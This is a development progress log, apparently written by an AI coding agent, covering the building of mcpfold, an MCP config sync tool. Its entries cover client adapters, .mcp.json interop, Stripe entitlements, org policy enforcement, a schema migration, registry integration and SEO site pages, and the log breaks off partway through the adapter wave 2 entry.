# PROGRESS

Ralph/Claude loop progress log. One entry per story, newest at the bottom of each story block.

---

## S19.1 — Adapter wave 1: JetBrains AI Assistant, Visual Studio, Continue, Roo Code

**Started** 2026-07-09 · branch `story/S19.1-adapter-wave-1` · priority p1, deps: none.

**Done** 2026-07-09.

Added four first-class client adapters (client count 8 → 12), each folding from the one canonical
config. Formats verified against primary docs at implementation time (July 2026):

- **JetBrains** (`jetbrains`, shim, no restart) — AI Assistant takes a `mcpServers`-shaped paste-in
  JSON (with Import-from-Claude) and does not persist a stable user file; the JetBrains agent surface
  (Junie) reads the same JSON from disk, so we fold to `~/.junie/mcp/mcp.json` (user) and
  `<project>/.junie/mcp/mcp.json` (project). Reuses `createMcpServersAdapter`.
- **Visual Studio** (`visual-studio`, native-input, no restart) — reads the **VS Code dialect**
  (`servers` root + `inputs`), so it reuses `vscodeAdapter`'s render/parse verbatim and only overrides
  path resolution. Targets `~/.mcp.json` (user) and `<project>/.mcp.json` (solution) — deliberately
  NOT `.vscode/mcp.json` or `.cursor/mcp.json`, which the vscode/cursor adapters own (no double-write).
  A test asserts it never resolves to a vscode/cursor-owned file.
- **Continue** (`continue`, shim, no restart) — Continue auto-loads Claude-style JSON dropped into
  `.continue/mcpServers/`, so we fold to `mcpfold.json` there (`~/.continue/mcpServers/` user,
  `<project>/.continue/mcpServers/` project) — no YAML dependency needed. shim for now; native
  `${{ secrets.NAME }}` interpolation is deferred to S19.4.
- **Roo Code** (`roo-code`, shim, no restart) — Cline fork; global storage file
  `<VS Code User>/globalStorage/rooveterinaryinc.roo-cline/settings/cline_mcp_settings.json` (user)
  and `<project>/.roo/mcp.json` (project). Reuses `createMcpServersAdapter`.

Also: `CLIENT_IDS` + JSON schema regenerated (12 clients), `ALL_ADAPTERS`/registry updated,
`detect-clients` picks up all four automatically (maps `ALL_ADAPTERS`), matrix goldens + compat
samples captured, per-OS path + render→parse tests per adapter, `docs/coverage.md` table and notes
updated.

`verify_all` green: lint + core-purity, typecheck (all 8 workspaces), `pnpm -r test`
(core 74, adapters 93, cli 208, schema 6, secrets 35, proxy 47, security 8, e2e 10), and `pnpm -r build`.

**Out-of-scope tree repair (pre-existing reds on `main`, unrelated to E19; fixed so the story could
land on a genuinely green suite):**

- `security/leak.test.ts` + `e2e/team-config.test.ts`: `TrustGate` mock/await drift from S18.1 —
  broke repo-wide `pnpm typecheck`. Conformed the mock and awaited the now-async `runTrust`.
- `e2e/deploy-env.test.ts` (S8.5): the deployment runbook was missing 8 real env vars
  (`POSTGRES_DB`, `JWT_EXPIRY`, `REALTIME_ENC_KEY`, `REALTIME_SECRET_KEY_BASE`, `GITHUB_OAUTH_ENABLED`,
  `DISABLE_SIGNUP`, `PORT`). Documented them in `docs/deployment.md` §Step 3/§Step 5.
- CI `docs` gate (`docs:build` link-checker) and the `core purity` gate's Prettier `--check` step —
  both run in CI but NOT in `verify_all`, so they only surfaced on the PR. Fixed a broken in-doc
  anchor and ran `prettier --write` on 5 pre-existing-unformatted files (`.github/FUNDING.yml`,
  `.github/ISSUE_TEMPLATE/bug_report.md`, `docs/seo/homepage-copy.md`, `scripts/build-binary.mjs`,
  `scripts/render-packaging.mjs`) plus this story's own docs/tests.

**Follow-ups (not blocking S19.1):**

- `compat/run.ts` flags a **pre-existing** gemini-cli divergence: its captured sample lacks `httpUrl`
  (adapter renders `httpUrl` for streamable-http per S17.3). The compat harness is a separate
  scheduled job (not in `verify_all`), so it does not gate CI — but the gemini-cli sample should be
  re-captured (`npx tsx compat/run.ts --capture`) in a follow-up.
- S19.2 (adapter wave 2), now unblocked, and S19.4 (native-interpolation secrets, would upgrade
  Continue/VS from shim to native refs).

---

## S20.1 — Decide and implement the `.mcp.json` interop strategy

**Started** 2026-07-09 · branch `story/S20.1-mcp-json-interop` · priority p1, deps: none.

**Done** 2026-07-09.

**Decision: option (b)** — `mcp.config.jsonc` stays the single canonical format (a superset with
profiles/tags/secret-refs the flat file can't express); `.mcp.json` becomes a first-class
**import source + export target**. Full rationale in `docs/adr/mcp-json-interop.md` (ADR 0001).
Rejected (a) alternate-canonical-filename (collides with claude-code's own project target and
throws away profiles/tags/refs) and (c) status quo (reads as fighting the emerging standard).

Implemented:

- **`mcpfold export --mcp-json`** (new command, `packages/cli/src/commands/export.ts`) — renders
  every server (or one `--profile`) to a flat `.mcp.json`. Bearer/header/env secret refs are
  preserved as env interpolation where possible (`${env:NAME}` → `${NAME}`); non-env schemes
  (`infisical`/`op`/`keychain`/`dotenv`) are left verbatim and **reported** (never downgraded to a
  value). Refuses to write onto a canonical filename; `--force`/`--dry-run`/`-o` supported.
- **`mcpfold import`** extended — a bare `<cwd>/.mcp.json` is adopted as a first-class source (tag +
  profile `mcp-json`), `${VAR}` → canonical `${env:VAR}`. Refactored the per-source merge into a
  shared `ingestSource`. Also hardened `redactSecrets` to never destroy a value that already embeds
  a ref (e.g. `Authorization: Bearer ${env:X}`).
- **north_star** updated (prd meta): "own" → "steward the neutral config format — canonical
  `mcp.config.jsonc`, first-class `.mcp.json` interop."
- Docs: ADR 0001 + a "Relationship to `.mcp.json`" section in `docs/config-format.md` (one paragraph
  a stranger can repeat). `init` and guided flows now point at import/export of `.mcp.json`.

Tests: `export.test.ts` (all-servers, env-vs-non-env ref handling, `--profile`, `--dry-run`,
overwrite guard, canonical-filename guard, export→import round-trip) + `import.test.ts` (bare
`.mcp.json` pickup, `${VAR}` normalization, unreadable-file skip). Completion snapshots + the
`--help` command-list test updated for the new `export` command.

`verify_all` green (lint + purity, typecheck ×8 workspaces, `pnpm -r test` — cli now 218, +10 —
and `pnpm -r build`), plus `docs:build` link-check and Prettier `--check`. End-to-end smoke-tested
against the built binary (`export --mcp-json` → `import` round-trip).

**Out-of-scope tree repair (pre-existing CI bug exposed by this story):** the new `init` next-steps
lines changed the golden terminal demo, so `demo/mcpfold.cast` + both `demo.svg` copies were
regenerated (`pnpm demo:record`). Regenerating `apps/site/public/demo.svg` triggered the `site.yml`
workflow, which has been red on **every** `main` commit for days. Two chronic bugs fixed: (1) it
built the site without its workspace deps (`pnpm --filter @mcpfold/site build`) so it couldn't
resolve `@mcpfold/core`'s dist → `--filter "@mcpfold/site..."` (deps-first, like `pages.yml` for
`@mcpfold/web`); (2) the Lighthouse config's `staticDistDir` pointed at `dist` (repo root) instead of
`apps/site/dist`. This unblocks the site pipeline for the remaining E13/E15 site stories too.

**Follow-ups (not blocking):** S20.2 (Stripe billing) and S20.3 (SSO) remain; S19.4 would let
export target native `${{ secrets }}` interpolation for Continue instead of shim.

---

## S17.2 — Per-client native-remote vs mcp-remote-shim decision matrix

**Started** 2026-07-09 · branch `story/S17.2-remote-capability-matrix` · priority p1, deps: S17.1.

**Done** 2026-07-09.

`mcp-remote` is explicitly transitional, so mcpfold now folds a remote server to each client's own
native entry wherever it can and bridges with the pinned shim only for the residue — driven by an
explicit per-adapter capability, not ad-hoc per-adapter code.

- **Capability contract:** `ClientAdapter.remote: { nativeHttp, nativeOauth, fieldShape }` (new in
  `types.ts`), declared for all 12 adapters (verified against primary docs). Shim predicate
  (`remoteNeedsShim`): a server is bridged only when it's remote **and** (`!nativeHttp` OR
  `authed && !nativeOauth`).
- **Unified shim path:** `renderRemoteShim` / `parseRemoteShim` / `remoteNeedsShim` live in the
  shared factory; `createMcpServersAdapter` renders native-or-shim per capability and reverses shims
  on parse. **Windsurf** collapsed from ~130 bespoke lines to the factory + its capability.
- **Correctness fix:** **Claude Desktop**'s config is stdio-only (verified — remotes go through the
  Connectors UI, not the file), so it was previously emitting a `url` entry it can't read. It now
  correctly shims **all** remotes (`nativeHttp: false`). Native clients (Claude Code/Cursor/VS
  Code/Zed/…) emit their native remote entry.
- **`mcpfold run`:** added `planRemoteRun` — the explicit seam that prefers a direct connection but
  falls back to the pinned bridge, because the CLI ships no native HTTP transport (adding one would
  mean a heavy dep + more attack surface, against this story's own goal).
- Docs: `docs/coverage.md` gains a **Remote transport** column + the capability explainer. Matrix
  goldens updated (only claude-desktop changed — now a shim); compat sample updated.

Tests: new `remote-capability.test.ts` (capability metadata, shim predicate, native-vs-shim per
client, unauth-vs-authed, **capability-override flips the form**, shim round-trip) + a `planRemoteRun`
unit test. Adapters 100 (+7), CLI 219 (+1).

`verify_all` green (lint + purity, typecheck ×8 workspaces, `pnpm -r test`, `pnpm -r build`), plus
`docs:build`, Prettier `--check`, and no demo drift. End-to-end smoke-tested against the built
adapters (native `type+url` for Claude Code; shim for Claude Desktop + authed Windsurf).

**Follow-ups (not blocking):** S17.5 (schema v2 naming), S17.7 (registry), and the still-open
pre-existing gemini-cli compat-sample drift (re-capture; the compat harness is a separate scheduled
job, not part of `verify_all`).

---

## S20.2 — Wire Stripe billing into the entitlement stub

**Started** 2026-07-09 · branch `story/S20.2-stripe-entitlements` · priority p1, deps: none.

**Done** 2026-07-09 (mock-mode; no live Stripe keys — verified via Deno unit tests, web e2e mock,
and CI's db-integration for the RLS + live-DB paths).

The stub granted `team` to everyone; that grant is **gone**. Team cloud features are now gated by a
real, Stripe-backed, **fail-closed-to-free** entitlement per team.

- **Edge (Deno):**
  - `lib/entitlements.ts` rewritten: `dbEntitlementChecker` reads `public.entitlements` and returns
    the stored tier only while the subscription is active-ish; missing/inactive/error → `cloud-free`
    (never `team`). `requireEntitlement` guard.
  - `lib/stripe.ts` (new): webhook **signature verification** via WebCrypto HMAC-SHA256 (Stripe's
    `t=…,v1=…` scheme with replay-tolerance) — no SDK, fully offline-testable; `tierForPriceId`; an
    injectable `StripeClient` (live REST client for Checkout/Portal, faked in tests).
  - `functions/billing/` (new): `POST …/billing/webhook` (signature-verified, **idempotent** via a
    `billing_events` PK ledger, upserts entitlements from `customer.subscription.*`), `checkout` +
    `portal` (owner-gated Stripe URLs), `entitlement` (RLS-read tier). Wired into `server.ts`.
  - `functions/teams`: inviting members now returns **402** unless the team has the `team-config`
    entitlement (enforced only when the checker is injected — the production router always does).
- **Migration `0007_entitlements.sql`:** `entitlements` (one row/team, tier + Stripe ids) and
  `billing_events` (idempotency ledger), both RLS-enabled. Members can READ their team's entitlement;
  no client write policy (webhook writes as the BYPASSRLS service connection); `billing_events` is
  not client-accessible. RLS asserted in `test-rls.sh`.
- **Web:** `TeamConsole` shows the tier badge, gates the invite form on the free tier with an
  **Upgrade** (Checkout) CTA, and a **Manage billing** (Portal) link on paid tiers; `teamsApi` gains
  `entitlement`/`checkout`/`portal`. The teams e2e now drives the full free → upgrade → team flow.
- **CLI stays ungated:** new `e2e/cli-ungated.test.ts` structurally asserts the OSS CLI imports no
  entitlement/billing code — a paywall can never leak into the free tool.
- **Docs:** `pricing-model.md` §Billing rewritten from "not yet integrated" to the implemented
  behavior; the four optional `STRIPE_*` env vars documented in `deployment.md`.

Verification: `deno test` (26 passed — 12 new billing tests: signature valid/wrong/tampered/replay,
tier fail-closed, webhook idempotency, subscription.deleted downgrade, owner-gated checkout, invite
402/allow), teams playwright e2e (green), `pnpm -r test` (all packages), lint + typecheck ×8 +
Prettier + `docs:build` + deploy-env. The RLS migration + full DB-backed edge tests run in CI's
db-integration job (which stands up Postgres — not runnable locally).

**Follow-ups (not blocking):** pending-invite redemption + SSO (S20.3); a live-Stripe smoke test in a
dedicated environment; per-seat pricing if the team tier moves from per-team to per-member.

---

## S18.3 — Org-managed policy: server allow/deny lists enforced at sync, add, and run

**Started** 2026-07-09 · branch `story/S18.3-org-policy` · priority p1, deps: none.

**Done** 2026-07-09 (CLI-side, fully local-verified).

An org can now publish ONE `mcp.policy.jsonc` that mcpfold enforces on every dev machine and in CI,
cross-client — the control the individual clients only ship walled. **Deny always wins over local
trust** (policy is org intent; TOFU stays the per-machine approval).

- **`packages/core/src/policy.ts` (new, pure):** versioned zod schema; rules match by `name` /
  `package` prefix / `namespace` (`@scope`) / `url` glob (AND over a rule's matchers);
  `mode: strict` (allow-list) vs `permissive` (deny-list, default). One shared `evaluatePolicy`
  (deny → `not-allowlisted` in strict → permitted), with package/namespace extraction from runner
  args. Exported from core.
- **Published schema:** `packages/schema` generates + commits `mcp.policy.schema.json`, served at
  `/schema/policy/v1.json` (staged by the docs build), drift-checked like the config schema.
- **CLI discovery (`util/policy.ts`):** first-found of project `mcp.policy.jsonc` → `$MCPFOLD_POLICY`
  → machine-managed location (per-OS: `%PROGRAMDATA%`/`/Library/Application Support`/`/etc`). One
  `checkServer` + `describeViolation` (carries rule + file provenance).
- **Enforcement (one evaluator, four call-sites):** `run` and `add` refuse a denied server outright;
  `sync` strips denied servers + warns (permissive) or refuses to write anything (strict); `sync
--check` exits nonzero on a violation and `scan` reports it — both with rule + policy-file
  provenance.
- **Docs:** `docs/team-config-as-code.md` gains the org-policy story with an example policy file,
  discovery/precedence, and a CI snippet.

Tests: `core/test/policy.test.ts` (matchers, namespace/package extraction, strict/permissive,
deny-wins, schema rejection) + `cli/test/policy.test.ts` (discovery precedence, sync strip/strict-
fail/`--check` provenance, add refuse, run refuse **deny-wins-over-trust** + allow) + schema drift.
`verify_all` green (lint+purity, typecheck ×8, `pnpm -r test` — core 12 files, cli 33 — build),
plus `docs:build`, Prettier, deploy-env.

**Follow-ups (not blocking):** S17.7 (registry) will let `add --from-registry` reuse the same
evaluator; a managed-machine "policy cannot be overridden by a project file" hard-lock mode if orgs
want it stricter than first-found-wins.

---

## S17.5 — Schema v2: streamable-http, oauth marker, sse deprecation (first real migration)

**Started** 2026-07-09 · branch `story/S17.5-schema-v2` · priority p1, deps: none.

**Done** 2026-07-09 (core/schema, fully local-verified incl. an end-to-end `mcpfold migrate` smoke).

`SCHEMA_VERSION` is now **2**, modeling today's transport/auth reality — and it's the **first real
migration**, proving the v1 migration infra end to end.

- **Transports:** canonical remote transport is `streamable-http` (the spec's Streamable HTTP;
  HTTP+SSE deprecated 2025-11-25). `http` is accepted as an alias and canonicalized on load (zod
  `preprocess`). `sse` still loads/folds but `doctor` warns (new `checkDeprecatedTransports`).
- **`auth.type: 'oauth'`** — a declarative marker (no token/headers): the client runs OAuth 2.1
  itself. Adapters fold it to a bare native remote (no auth material), it's never shimmed
  (`remoteNeedsShim` now treats only static bearer/header auth as shim-forcing), and `doctor` pushes
  no token at it.
- **Real 1→2 migration** (replacing the worked example): bumps version + rewrites `http` →
  `streamable-http`, lossless. `loadConfig` auto-migrates a v1 file **in-memory** so it keeps
  loading; `mcpfold migrate` persists the upgrade with a backup.
- **Adapters:** parse-returns now yield the canonical `streamable-http`; render still emits each
  client's dialect (`type: http` / bare `url` / `httpUrl`), so **matrix goldens are unchanged**.
- **Published schema:** committed schema regenerated (v2, `$id .../schema/v2.json`); the docs build
  serves it at `/schema/v2.json` and keeps `/schema/v1.json` resolving so old `$schema` pointers work.
- **Docs:** `config-format.md` updated (transports, `oauth`, sse deprecation, v2 versioning/migration).

Tests: core migration (http→streamable-http, stdio/sse untouched, round-trip), schema (`http` alias
canonicalizes, `oauth` validates, version const 2, JSON-schema drift), adapters (all 100 green, incl.
oauth-not-shimmed), CLI (`migrate` v1→v2 persists + backs up, `doctor` sse-warns/oauth-clean, `add`
creates streamable-http). Swept ~40 typed `version:1`/`transport:'http'` literals across core/cli/
web/secrets/security to v2/streamable-http (runtime tests passed via esbuild; `tsc`/build caught the
typed ones). `verify_all` green (lint+purity, typecheck ×8, `pnpm -r test`, build) + docs:build +
Prettier + demo drift + an end-to-end `migrate`+`doctor` smoke on a real v1 file.

**Follow-ups (not blocking):** a frozen v1 JSON-schema snapshot if strict per-version autocomplete is
ever wanted (today both URLs serve the current schema); adapters could emit a client-specific OAuth
hint field for clients that want one.

---

## S17.7 — Official MCP registry integration: `add --from-registry` and `search`

**Started** 2026-07-09 · branch `story/S17.7-registry` · priority p1, deps: none.

**Done** 2026-07-09 (CLI-side; unit + integration tested, and **smoke-tested live against the real
registry**).

One command turns an official-registry listing into the **safest possible** canonical entry —
pinned to an exact version, integrity-hashed where available, every secret a reference, never a
value. No competitor in the sync niche does this mapping.

- **`registry/client.ts`** — client for `registry.modelcontextprotocol.io` (frozen v0 API).
  Injectable `fetch`; base URL overridable via `MCPFOLD_REGISTRY_URL` (subregistries/mirrors);
  `search(query)` + `getByName(name)` (exact, latest). Network failure → actionable offline error
  (S0.9), **nothing written**.
- **`registry/map.ts`** (pure) — `server.json` (2025-12-11) → canonical: `packages[]`
  (npm→npx / pypi→uvx / oci→docker …) with `pin` = exact version and `integrity` (SRI from an mcpb
  `fileSha256`); `remotes[]` (streamable-http/sse) → remote server; `environmentVariables`/`headers`
  with `isSecret` → `${scheme:NAME}` **references**. **Refuses** an unpinnable package or a raw
  secret value (even when the listing ships a secret `default`).
- **`mcpfold add <name> --from-registry`** — fetch → map → org-policy gate → comment-preserving
  insert under a derived local key (`--as` to override). `--secret-scheme env|dotenv|infisical|
keychain|op` (or an interactive prompt).
- **`mcpfold search <query>`** — human + `--json` list of matching servers.
- **`docs/registry.md`** — the full `server.json` → `mcp.config` mapping table, subregistry override,
  offline behavior.

Tests: `registry.test.ts` (19) — mapper (npm/pypi/oci/mcpb/remotes, isSecret→ref, refusal paths,
no-raw-value-even-with-default), client (search/getByName, base-URL override, offline + non-ok
errors), and `add --from-registry`/`search` integration (derived key, `--as`, no-write-on-failure).
Completion snapshots + `--help` list updated for the new `search` command.

`verify_all` green (lint+purity, typecheck ×8, `pnpm -r test` — cli 34 files/248 — build), plus
`docs:build`, Prettier, deploy-env. **Live smoke**: `search github` and
`add ai.smithery/smithery-ai-github --from-registry` against the real registry produced a
`streamable-http` server with the secret header as `${env:Authorization}` — never a value.

**Follow-ups (not blocking):** a `--package`/`--remote` selector when a listing has several; caching
registry responses for offline reuse.

---

## S15.2 — GEO answer layer: llms.txt, extraction-friendly content, FAQ schema

**Started** 2026-07-09 · branch `story/S15.2-geo` · priority p1, deps: S15.1, S13.4.

**Done** 2026-07-09 (apps/site; prerender + site e2e green).

mcpfold's buyers research inside Claude/ChatGPT/Perplexity, so answer engines now get a clean,
structured, permission-granted surface to read and cite.

- **`/llms.txt` + `/llms-full.txt`** — generated by `apps/site/scripts/gen-llms.mjs` into dist root
  (wired into the site build). `llms.txt` = product summary + focus terms + canonical link map;
  `llms-full.txt` expands with self-contained answer units.
- **FAQPage JSON-LD + visible FAQ** — `seo/faq.ts` is the single source for both the `FAQPage`
  structured data (emitted per path via `jsonld.ts`) and a visible `<FaqSection>` on the homepage +
  `/install` + `/pricing` + `/directory`. The pricing page's old inline FAQ was unified onto this
  shared source (so JSON-LD always matches visible content). Answers are answer-first and
  self-contained (name mcpfold, definition in the first sentence).
- **`robots.txt`** — explicitly allows GPTBot, OAI-SearchBot, ChatGPT-User, ClaudeBot, Claude-Web,
  PerplexityBot, Perplexity-User, Google-Extended, and links the sitemap.
- **`docs/geo-playbook.md`** — the answer-first writing pattern, the robots decision, and a
  repeatable GEO-check (5 prompts to run against assistants, scored named/accurate/linked, baseline
  row recorded). Deliberately manual (answer-engine output is non-deterministic → a scripted assert
  would be flaky).

Tests: `prerender.e2e.ts` gains three GEO checks — `/llms.txt`+`/llms-full.txt` resolve with the
summary + canonical links; `robots.txt` names the AI crawlers + sitemap; homepage + core pages carry
valid `FAQPage` JSON-LD with self-contained answers in the no-JS HTML. Pricing e2e updated for the
unified FAQ text.

`verify_all` green (typecheck ×8, `pnpm -r test`, lint, Prettier, `docs:build` — 29 docs), site build
generates the artifacts, and **site e2e (18) + prerender e2e (7) pass**.

**Follow-ups (not blocking):** apply the answer-first pattern to the glossary (S15.6) and per-client
guides (S15.5) as they ship; run the first live GEO check and fill in the baseline table.

---

## S15.3 — Homepage + core-page on-page SEO and messaging

**Started** 2026-07-09 · branch `story/S15.3-seo` · priority p1, deps: S13.2, S15.1.

**Done** 2026-07-09 (apps/site; site e2e + prerender e2e green).

Reworked the homepage's on-page SEO around the focus keyword **"MCP config"** / "one config for
every MCP client", without losing the context-window-tax brand line or the committed benchmark.

- **Hero:** H1 is now keyword-first + brand — "mcpfold — one **MCP config** for every client". The
  first ~100 words (a new `hero-intro`) name MCP config, MCP servers, and the supported clients
  (Claude Code, Claude Desktop, Cursor, VS Code, Windsurf, Zed); the context-window tax + the
  committed token-savings % moved into the benchmark line right below.
- **`meta.ts`:** homepage `<title>` = "mcpfold — one MCP config for every MCP client"; description
  leads with the keyword cluster ("Manage MCP servers from one config, folded out to every MCP
  client — …") within the length budget.
- **Below-fold H2 sections** (each a keyword cluster): manage every server from one file · works
  with every MCP client (the 12 clients rendered as **crawlable links** to /docs/coverage) · curate
  tools/cut the context-window tax · secrets as references. Plus an "Explore" internal-link graph out
  to /install, /directory, /docs, /pricing.
- **`seo/keyword-map.ts`:** the in-repo keyword→page map (target term per core page, `live` vs
  `planned`), including the future /guides (S15.5) and /glossary (S15.6) pages — those homepage links
  wire in when those stories ship.

Tests: `home.e2e.ts` gains four checks — title/H1/meta contain the target terms + client names +
meta-length budget; the four H2 clusters are present; the client list renders as links; the internal
links point at /directory, /docs, /pricing. `homepage.e2e.ts` + `prerender.e2e.ts` updated for the
new copy; the benchmark headline still matches the committed value.

`verify_all` green (typecheck ×8, `pnpm -r test`, lint, Prettier). **Site e2e (22) + prerender e2e
(7) pass.**

**Follow-ups:** wire the homepage's guides/glossary links when S15.5/S15.6 ship; apply the same
title/H1/meta pass to the remaining core pages as their content lands.

---

## S15.4 — Directory expansion + category/collection pages (pSEO)

Started/done: 2026-07-09. Grew the curated directory from **5 → 70 real, verified MCP servers**
and turned it into a categorized, indexable discovery surface targeting the "best/awesome MCP
servers" + "MCP server list/directory" cluster.

**Curation (quality over count).** Every entry's package was verified to exist on **npm or PyPI**
before listing (a scripted npm/PyPI check) — junk was dropped, including a `mcp-server-fetch`
typosquat literally self-described as a "security research canary". Descriptions are neutral
one-liners; tokens stay `${env:…}` references, never values; stdio launch via `npx`/`uvx`. Per the
product call on this story, this ships as a **curated, growing** set (70) rather than padding to 150
with unverifiable entries — reaching 150+ is a documented follow-up.

**Single source + mirror.** `packages/core/src/directory.ts` is the one source. The DB seed
`supabase/seed/directory.sql` is now **generated** from it by `directorySeedSql()`
(`pnpm --filter @mcpfold/core gen:directory-seed`); `apps/web` already re-exports core, so the app,
the marketing directory, and the DB all read the same 70 entries. A core test fails if the committed
SQL ever drifts from `DIRECTORY`.

**Collection / category pages.** New `/directory/category/<tag>` pages ("Best <category> MCP
servers"), each prerendered with **ItemList + BreadcrumbList JSON-LD**, a targeted title/H1, and
cross-links; the directory index now leads with "Best MCP servers", a browse-by-category nav, and a
`{count}+` count. Per-server pages are richer — an "How it runs" section (transport + exact launch
command) and category tags that link to their collection page.

**Thin-page / index-bloat guard.** A tag earns a page only once **`MIN_CATEGORY_ENTRIES` (3)**
distinct servers carry it. 13 categories qualify and are prerendered + in the sitemap; 6 thin tags
(finance, crm, memory, automation, monitoring, data) get no page (the route renders a not-found stub,
and they're absent from the sitemap). Documented in `directory.ts`, guarded by tests on both sides.

Tests: `packages/core/test/directory.test.ts` (5) — 60+ valid deduped entries, ref-only tokens,
every tag has a label, the thin-page guard, and the SQL-mirror no-drift check. `directory.e2e.ts`
gains category-browse + cross-link + thin-guard cases; `prerender.e2e.ts` gains a category-page
ItemList + sitemap (populated-only) check.

`verify_all` green (lint, typecheck ×8, `pnpm -r test` = 91 core + 11 e2e, `pnpm -r build`,
Prettier, docs:build). **Site e2e (24) + prerender e2e (8) pass**; 91 routes prerender (70 servers +
13 categories).

**Follow-ups:** grow the curated set toward 150+ (more verified servers per category); add
remote/`streamable-http` servers once a hosted set is curated; surface category nav in the global
site IA when S13.9 lands.

---

## S13.8 — Homepage: full narrative below the hero

Started/done: 2026-07-09. Completed the homepage body so a visitor who scrolls past the hero +
benchmark gets the whole story and converts without leaving.

- **Features overview** — the four pillars (one config for every client · curate tools/cut the
  context tax · secrets as references · sync/diff drift), each a keyword-led H2 **linking to its
  live `/docs` deep-dive**. (S13.10 will expand these into `/features` pages; today the docs deep-
  dives are the real, live targets — no dead links, matching the S15.3 "link live only" precedent.)
- **How it works** (`home/HowItWorks.tsx`) — the **init → import → sync → diff** sequence, each step
  a real CLI command with a copy-paste `CopyBlock`.
- **Use-cases teaser** (`home/UseCases.tsx` + `personas.ts`) — three persona cards (solo devs /
  teams / power users), each linking to a live surface now; `personas.ts` is the single source
  S13.11 turns into dedicated pages.
- **OSS-credibility slot** (`home/Credibility.tsx`) — MIT + the **npm version sourced from the build**
  (`__APP_VERSION__`, the committed CLI package) are baked into the **prerendered HTML**; the live
  **GitHub star count is fetched client-side and degrades gracefully** (repo link always present, no
  count/no error if the API is unavailable). No implied endorsement — factual signals only.
- **Final CTA** (`home/FinalCta.tsx`) — repeats the primary Install action + secondary team-cloud
  action.

Tests: `home.e2e.ts` gains seven cases — features deep-dive links, the four how-it-works commands +
copy buttons, persona links, credibility-from-source, the **star signal live + graceful-degrade**
(GitHub API mocked available/aborted), and the final CTA. `prerender.e2e.ts` proves the full
narrative (commands, use-cases, MIT, npm version) is in the no-JS HTML and that the client-only star
count is **not**.

`verify_all` green (lint, typecheck ×8, `pnpm -r test`, `pnpm -r build`, Prettier, docs:build).
**Site e2e (30) + prerender e2e (9) pass.**

**Follow-ups:** repoint the pillar "deep-dive" links to `/features/<slug>` when S13.10 ships and the
persona cards to `/use-cases/<id>` when S13.11 ships (both single-sourced already).

---

## S13.9 — Global navigation, header, footer, and site IA

Started/done: 2026-07-09. Replaced the flat S13.1 header/footer with a real information
architecture driven by a single source, so every page is reachable from anywhere and new pages
register in one place.

- **`site-structure.ts`** — the single source for header nav + footer link map. Each link carries a
  `status`; `planned` pages (Features S13.10, Guides S15.5) are registered but **not rendered until
  they exist**, so the nav never 404s (same "link live only" precedent as the keyword map).
  `liveInternalPaths()` exposes the registered live paths so the IA can also feed the sitemap.
- **`nav/Header.tsx`** — responsive header: desktop nav with **active-route indication**
  (`aria-current="page"`), primary **Install** CTA + secondary **Open app** link, a single
  always-visible **theme toggle**, and an accessible **mobile menu** (hamburger with
  `aria-expanded`/`aria-controls`, closes on link click and on **Escape**). Internal routes use the
  SPA `<Link>`; docs/external use real anchors.
- **`nav/Footer.tsx`** — the complete grouped link map (Product · Resources · Community · Company)
  plus the MIT license + no-endorsement note, from the same source.
- **`Layout.tsx`** — adds a **skip-to-content** link (visually hidden until focused, targets
  `<main id="main">`) ahead of the header.
- **`tokens.css`** — responsive nav (desktop row ↔ hamburger at ≤820px), skip-link, and focus
  styles.

Tests: `nav.e2e.ts` (5) — live/active/planned header, click-to-navigate active-state move, the
mobile menu (open → navigate → close on link + Escape), the footer link map resolving against the
route table with planned pages omitted, and the skip link + theme toggle. All existing suites still
green (theme-toggle is now a single instance).

`verify_all` green (lint, typecheck ×8, `pnpm -r test`, `pnpm -r build`, Prettier, docs:build).
**Site e2e (35) + prerender e2e (9) pass** — header/footer render in the prerendered HTML and hydrate
without warnings.

**Follow-ups:** flip Features/Guides to `live` in `site-structure.ts` when S13.10 / S15.5 ship (they
then appear in nav + footer automatically); wire `liveInternalPaths()` into the sitemap if non-
enumerated pages are ever added.

---

## S13.13 — Security & trust page

Started/done: 2026-07-09. Added a public `/security` trust page for security-conscious adopters —
plain-language, every claim mirrored to the authoritative docs (`docs/security.md`,
`docs/secrets.md`, `docs/threat-model.md`, `docs/security-posture.md`) and `SECURITY.md`, with the
honest caveats stated rather than glossed.

- **`security/SecurityPage.tsx`** — seven sections: refs-only secret handling (with the honest
  boundary — a value is written only via the **opt-in `inline` strategy to a gitignored target**,
  else refused, not a blanket "never touches disk"); nothing sensitive synced to the cloud (client
  guard + server ref-only guard + DB `config_is_ref_only` backstop); local-first by default;
  redacted diagnostics + telemetry **off unless `MCPFOLD_TELEMETRY=1`** (allow-listed
  non-identifying fields, `DO_NOT_TRACK` honored); supply-chain/integrity (`doctor`/`pin`/`scan`,
  plus the honest "config is executable code" caveat); machine-verified by the leak harness + CI
  gitleaks/audit; and a **responsible-disclosure** section linking `SECURITY.md` + the private
  advisory path + email. Each section deep-links its authoritative doc (all four verified to exist
  and build).
- **Wiring** — `/security` route + SEO meta + prerender + sitemap; footer "Security & trust" points
  here (single-source `site-structure.ts`); `FaqSection` gained an optional `moreLink`, used on the
  pricing FAQ to link the page.

Tests: `security.e2e.ts` (3) — the page renders the secret-handling summary (incl. the `gitignored`
caveat) and the disclosure links (`SECURITY.md` + advisory), and is reachable from both the footer
and the pricing FAQ. `nav.e2e.ts` footer-route allow-list updated for `/security`.

Accuracy: claims cross-checked against `SECURITY.md` and `docs/security.md` — the inline-strategy
nuance, the telemetry opt-in, and the config-is-executable-code caveat are stated explicitly; no
overstatement.

`verify_all` green (lint, typecheck ×8, `pnpm -r test`, `pnpm -r build`, Prettier, docs:build).
**Site e2e (38) + prerender e2e (9) pass**; 92 routes prerender.

---

## S19.2 — Adapter wave 2: bespoke formats (Goose, Codex CLI, LM Studio, Warp, opencode, Copilot CLI)

Started/done: 2026-07-09. Added six new client adapters — the matrix goes **12 → 18** — including
the first non-JSON (YAML/TOML) and first shared-config-file (merge, not clobber) adapters. Every
format was verified against current primary docs at implementation time (six parallel doc-research
passes; dates + sources recorded in `docs/coverage.md`), and none were deferred — every researched
client had a stable, documented on-disk file.

- **Shared-factory adapters** (dedicated JSON files, full replace, `mcpServers` root): **LM Studio**
  (`~/.lmstudio/mcp.json`, Cursor notation), **Warp** (`~/.warp/.mcp.json` user + project,
  file-based `.mcp.json`), **Copilot CLI** (`~/.copilot/mcp-config.json`, honors `COPILOT_HOME`,
  `includeType` so entries carry `type: stdio|http`).
- **Bespoke adapters** (merge into a file the client shares with non-MCP settings — preserve every
  unmanaged key): **Goose** (YAML `config.yaml`, `extensions` map, `cmd`/`uri`, keeps builtin
